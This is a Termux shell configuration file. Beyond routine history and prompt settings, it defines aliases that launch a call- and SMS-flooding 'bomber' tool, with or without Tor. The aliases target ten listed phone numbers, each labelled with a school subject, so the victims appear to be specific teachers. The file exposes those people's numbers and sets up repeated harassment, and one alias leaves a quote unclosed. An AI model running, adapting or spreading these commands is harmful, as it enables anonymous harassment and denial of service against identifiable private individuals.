# Command history tweaks:
# - Append history instead of overwriting
#   when shell exits.
# - When using history substitution, do not
#   exec command immediately.
# - Do not save to history commands starting
#   with space.
# - Do not save duplicated commands.
shopt -s histappend
shopt -s histverify
export HISTCONTROL=ignoreboth

# Default command line prompt.
PROMPT_DIRTRIM=2
PS1='\[\e[0;32m\]\w\[\e[0m\] \[\e[0;97m\]\$\[\e[0m\] '

# Handles nonexistent commands.
# If user has entered command which invokes non-available
# utility, command-not-found will give a package suggestions.
if [ -x /data/data/com.termux/files/usr/libexec/termux/command-not-found ]; then
	command_not_found_handle() {
		/data/data/com.termux/files/usr/libexec/termux/command-not-found "$1"
	}
fi


################################################################

alias inf='cd && cd inf && chmod 777 inf && ./inf'
alias inf-tor='cd inf-tor && chmod 777 inf-tor && ./inf-tor'

#бомбер без тора, флуд звонки.

alias inf-bio='cd && cd inf && ./inf 79886100747 2 1 0'
alias inf-alg='cd && cd inf && ./inf 79094953366 2 1 0'
alias inf-geo='cd && cd inf && ./inf 79283898206 2 1 0'
alias inf-rus='cd && cd inf && ./inf 79280265297 2 1 0'
alias inf-xim='cd && cd inf && ./inf 79283960564 2 1 0'
alias inf-fiz='cd && cd inf && ./inf 79283949290 2 1 0'
alias inf-ist='cd && cd inf && ./inf 79631702053 2 1 0'
alias inf-ang='cd && cd inf && ./inf 79283920417 2 1 0'
alias inf-tex='cd && cd inf && ./inf 79283968782 2 1 0'
alias inf-inf='cd && cd inf && ./inf 79283984241 2 1 0'

#бомбер с тором, флуд звонки.

alias inftor-bio='cd && cd inf-tor && ./inf-tor 79886100747 2 1 0'
alias inftor-alg='cd && cd inf-tor && ./inf-tor 79094953366 2 1 0'
alias inftor-geo='cd && cd inf-tor && ./inf-tor 79283898206 2 1 0'
alias inftor-rus='cd && cd inf-tor && ./inf-tor 79280265297 2 1 0'
alias inftor-xim='cd && cd inf-tor && ./inf-tor 79283960564 2 1 0'
alias inftor-fiz='cd && cd inf-tor && ./inf-tor 79283949290 2 1 0'
alias inftor-ist='cd && cd inf-tor && ./inf-tor 79631702053 2 1 0'
alias inftor-ang='cd && cd inf-tor && ./inf-tor 79283920417 2 1 0'
alias inftor-tex='cd && cd inf-tor && ./inf-tor 79283968782 2 1 0'
alias inftor-inf='cd && cd inf-tor && ./inf-tor 79283984241 2 1 0'

#бомбер с тором, флуд смс.

alias inftor-bioo='cd && cd inf-tor && ./inf-tor 79886100747 1 1 0'
alias inftor-ximm='cd && cd inf-tor && ./inf-tor 79283960564 1 1 0'
alias inftor-algg='cd && cd inf-tor && ./inf-tor 79094953366 1 1 0'
alias inftor-geoo='cd && cd inf-tor && ./inf-tor 79283898206 1 1 0'
alias inftor-russ='cd && cd inf-tor && ./inf-tor 79280265297 1 1 0'
alias inftor-fizz='cd && cd inf-tor && ./inf-tor 79283949290 1 1 0'
alias inftor-istt='cd && cd inf-tor && ./inf-tor 79631702053 1 1 0'
alias inftor-angg='cd && cd inf-tor && ./inf-tor 79283920417 1 1 0'
alias inftor-texx='cd && cd inf-tor && ./inf-tor 79283968782 1 1 0'
alias inftor-inff='cd && cd inf-tor && ./inf-tor 79283984241 1 1 0'

#бомбер без тора, флуд смс.

alias inf-bioo='cd && cd inf && ./inf 79886100747 1 1 0'
alias inf-algg='cd && cd inf && ./inf 79094953366 1 1 0'
alias inf-geoo='cd && cd inf && ./inf 79283898206 1 1 0'
alias inf-russ='cd && cd inf && ./inf 79280265297 1 1 0'
alias inf-ximm='cd && cd inf && ./inf 79283960564 1 1 0'
alias inf-fizz='cd && cd inf && ./inf 79283949290 1 1 0'
alias inf-istt='cd && cd inf && ./inf 79631702053 1 1 0'
alias inf-angg='cd && cd inf && ./inf 79283920417 1 1 0'
alias inf-texx='cd && cd inf && ./inf 79283968782 1 1 0'
alias inf-inff='cd && cd inf && ./inf 79283984241 1 1 0'

alias info='
флуд звонками->

alg-алгебра
geo-география
russ-русский
xim-химия
fiz-физика
ist-история
ang-английский
tex-технология
inf-информатика
bio-биология


alias ls='ls --color=auto'
alias lsa='ls -a'
alias sgc='sudo git clone'
